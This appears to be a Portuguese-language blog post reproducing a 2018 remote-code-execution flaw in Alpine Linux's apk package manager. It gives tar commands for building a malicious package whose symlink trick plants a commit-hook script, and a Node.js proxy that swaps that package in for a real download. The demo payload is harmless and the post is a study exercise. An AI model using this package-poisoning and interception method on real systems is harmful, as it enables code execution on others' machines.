---
layout: post
title: Testando RCE no Alpine Linux usando APK
lang: pt_BR
description: Testando vulnerabilidade no APK do Alpine Linux
tags: docker alpine linux rce vulnerability apk
comments: true
--- 

Ultimamente eu tenho estudado um pouco de segurança e uma das coisas que estou fazendo de tempos em tempos é lendo CVE e tentando testar e entender o que está acontecendo. Ontem [Max Justicz](https://justi.cz/) publicou "[Remote Code Execution in Alpine Linux](https://justi.cz/security/2018/09/13/alpine-apk-rce.html). Ele encontrou problemas no `apk` o qual é o gerenciador de pacotes para o Alpine Linux que é super popular para imagens docker.

Max fez um trabalho excelente em explicar os passos e razões, mas eu queria testar eu mesmo. 


```
- Create a folder at /etc/apk/commit_hooks.d/, which doesn’t exist by default. Extracted folders are not suffixed with .apk-new.

- Create a symlink to /etc/apk/commit_hooks.d/x named anything – say, link. This gets expanded to be called link.apk-new but still points to /etc/apk/commit_hooks.d/x.

- Create a regular file named link (which will also be expanded to link.apk-new). This will write through the symlink and create a file at /etc/apk/commit_hooks.d/x.

- When apk realizes that the package’s hash doesn’t match the signed index, it will first unlink link.apk-new – but /etc/apk/commit_hooks.d/x will persist! It will then fail to unlink /etc/apk/commit_hooks.d/ with ENOTEMPTY because the directory now contains our payload.
```

As instruções dele parecem simples, mas se você não está super familiar como arquivos tar funcionam e alguns outros conceitos, você pode não entender. Em um arquivo tar você pode ter multiplas versões ou arquivos com o mesmo nome e extrair eles usando `--occurrence`. Com isso em mente as intruções fazem um pouco mais de sentido. 

Primeiramente criando os diretórios:
```
sudo mkdir /etc/apk/commit_hooks.d/
mkdir folder_for_link
mkdir folder_for_real_file
```

Criando o link
```
/etc/apk/commit_hooks.d/x folder_for_link/magic
```

Crie o arquivo `folder_for_real_file/magic` com este conteudo
```
#!/bin/sh

echo "something" > /tmp/test-12346-YAY
echo "ha" > /testfileroot
```
(Se isso realmente funcionar devemos ter esses dois arquivos no sistema.)

Agora temos praticamente tudo que precisamos e podemos criar o apk:
```
tar -zcvf bad-intention.apk /etc/apk/commit_hooks.d/ -C $PWD/folder_for_link/ magic -C $PWD/folder_for_real_file/ magic
```

Aqui estamos adicionando 3 arquivos em sequencia para o tar, você pode checar o resultado com:
```
$ tar tvf bad-intention.apk
drwxr-xr-x root/root         0 2018-09-13 19:44 etc/apk/commit_hooks.d/
lrwxrwxrwx root/root         0 2018-09-13 19:37 magic -> /etc/apk/commit_hooks.d/x
-rwxrwxrwx root/root 954 2018-09-13 23:24 magic
```
(Preste atenção na ordem dos mesmos, criação do diretorio commit_hooks.d, criação do link, criação do arquivo)

Qual deveria ser o comportamento agora? Já que o APK no Alpine roda apartir do `/` ele vai criar a pasta `/etc/apk/commit_hooks.k`, posteriomente vai extrair o link e terminar fazendo output do arquivo magic para o link o qual será escrito no arquivo X (apontado pelo link). *Note*, eu perdi MUITO TEMPO tentando verificar esse comportamento com o `tar` mas parece que este não possui esse comportamento e o `apk` implementou seu proprio extrator.

Certo, agora precisei entregar este arquivo quando rodasse `apk add` dentro do docker. Localmente, eu atualizei meu /etc/hosts e apontei `dl-cdn.alpinelinux.org` para localhost. Utilizando as bibliotecas `http-mitm-proxy http-proxy request` no nodejs, eu criei um servidor que forneceria o .apk criado caso a url contenha "ltrace" no meio, caso contrário baixaria o arquivo normalmente e instalaria.1

```
var http = require('http'),
    httpProxy = require('http-proxy'),
    request = require('request'),
    fileSystem = require('fs'),
    path = require('path');

var proxy = httpProxy.createProxyServer({});

var server = http.createServer(function(req, res) {
  console.log('http://nl.alpinelinux.org' + req.url)
  if (req.url.indexOf('ltrace') > -1) {
    console.log("Trapped")
    var filePath = path.join(__dirname, 'bad-intention.apk');
    var stat = fileSystem.statSync(filePath);
    var readStream = fileSystem.createReadStream(filePath);
    readStream.pipe(res);
  } else {
      proxy = request('http://nl.alpinelinux.org' + req.url)
      proxy.on('response', function (a, b) {}).pipe(res);
  }
});

console.log("listening on port 80")
server.listen(80);
```

Criando a imagem do docker com `docker build -t alpinetest --network=host --no-cache .`
```
FROM alpine:3.8

# RUN apk add python
RUN apk add ltrace

CMD "/bin/sh"
```
(Se você está curioso, você pode dar uma olhada dentro da imagem mesmo que o build tenha falhado. Você pode verificar que os arquivos estão no lugar certo. Utilize `docker commit CONTAINER_ID` e `docker run -it SHA256_STRING sh`.)

A saida retornou "The command '/bin/sh -c apk add ltrace' returned a non-zero code: 1". Isto acontece porque o `apk` verifica a assinatura do arquivo e tenta limpar os arquivos e diretórios porém ele não consegue já que existe um arquivo em `/etc/apk/commit_hooks.k`. Então como fazer alguma magica para fazer o comando retornar o exit code 0? Max encontrou um (ou dois) jeitos.

Eu ainda preciso estudar e entender o que exatamente o python script faz mas eu testei o mesmo e ele funciona. Como um teste rápido você pode descomentar `RUN apk add python` e atualizar o script `folder_for_real_file/magic` para chamar o código python. 

Matheus